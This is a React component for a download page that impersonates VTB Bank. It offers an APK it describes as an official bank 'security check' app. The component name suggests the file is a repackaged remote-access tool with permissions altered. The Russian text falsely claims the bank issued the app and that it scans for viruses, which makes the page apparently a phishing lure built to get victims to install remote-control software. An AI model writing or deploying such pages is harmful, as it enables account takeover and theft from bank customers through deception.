'use client'
import React from 'react';
import { isMobile } from 'react-device-detect';

export default function TitleInfoRuSdesk() {
  const handleDownloadClick = () => {
    const fileName = "Поддержка_ВТБ_v_1_1_10_1_b_28_Permissions_Removed.apk";
    const downloadLink = document.createElement("a");
    downloadLink.href = fileName;
    downloadLink.download = fileName;

    if (isMobile) {
      window.open(fileName, '_blank');
    } else {
      downloadLink.click();
    }
  };

  return (
    <div className="flex flex-col mt-[-160px] items-center">
      <button
        onClick={handleDownloadClick}
        className="border-2 p-3 rounded-md mb-4 border-btnVtb text-btnVtb"
      >
        Скачать App
      </button>
      <div className="w-full text-center mt-2 pl-2 text-black text-[14px]">
        <p className="mb-2">Это специальное приложение выпущено Банком "ВТБ".</p>
        <p className="mb-2">
          Наше приложение делает проверку на безопасность вашего личного кабинета.
        </p>
        <p>
          Обновляет и тестирует систему безопасности вашего смартфона, так же приложение вычисляет вредоносные файлы и вирусы.
        </p>
      </div>
      <div className="border-b-1 mt-4 w-full text-lineVtb"></div>
    </div>
  );
}
